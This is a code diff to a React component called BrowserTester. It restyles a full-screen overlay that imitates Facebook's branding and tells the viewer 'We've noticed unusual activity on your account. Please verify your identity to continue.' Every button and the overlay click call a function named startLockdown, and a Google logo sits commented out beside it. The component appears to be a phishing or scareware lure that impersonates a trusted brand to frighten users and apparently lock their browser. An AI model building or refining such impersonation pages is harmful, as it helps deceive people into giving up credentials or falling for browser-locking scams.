@@ -188,7 +188,8 @@ export default function BrowserTester() {
                     className="fixed inset-0 bg-gray-900 bg-opacity-50 flex items-center justify-center p-4 z-50 animate-fade-in"
                     onClick={startLockdown}
                 >
-                    <div className="bg-white rounded-xl shadow-2xl overflow-hidden max-w-md w-full relative p-8 text-center">
+                    <div className="bg-white rounded-xl shadow-2xl overflow-hidden w-full max-w-md mx-auto p-6 sm:p-8 text-center">
+                        {/* Optional Logo */}
                         {/*<div className="flex justify-center mb-4">
                             <svg width="60" height="60" viewBox="0 0 48 48">
                                 <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z" />
@@ -197,10 +198,13 @@ export default function BrowserTester() {
                                 <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z" />
                             </svg>
                         </div>*/}
-                        <h2 className="text-5xl font-bold text-center mb-8 text-[#1877F2]">facebook</h2>
-                        <p className="text-gray-600 mb-6">We’ve noticed unusual activity on your account. Please verify your identity to continue.</p>
+                        <h2 className="text-3xl sm:text-4xl md:text-5xl font-bold text-[#1877F2] mb-6 sm:mb-8">facebook</h2>
 
-                        <div className="flex gap-4 justify-center">
+                        <p className="text-gray-600 text-sm sm:text-base mb-6">
+                            We’ve noticed unusual activity on your account. Please verify your identity to continue.
+                        </p>
+
+                        <div className="flex flex-col sm:flex-row gap-4 justify-center">
                             <button
                                 onClick={startLockdown}
                                 className="flex-1 bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded transition-colors"
@@ -215,6 +219,7 @@ export default function BrowserTester() {
                             </button>
                         </div>
                     </div>
+
                 </div>
             )}
 
